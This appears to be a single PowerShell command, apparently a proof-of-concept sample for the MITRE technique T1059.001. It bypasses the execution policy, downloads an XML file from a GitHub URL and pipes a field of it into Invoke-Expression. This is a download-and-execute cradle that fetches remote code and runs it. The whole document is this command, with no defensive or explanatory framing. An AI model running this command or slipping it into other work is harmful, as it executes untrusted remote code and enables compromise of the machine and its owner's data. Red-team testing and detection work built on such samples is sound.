powershell.exe -exec bypass -noprofile "$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('https://github.com/nicovarvara/mw-poc/raw/refs/heads/main/t1059.001.xml');$Xml.command.a.execute | IEX
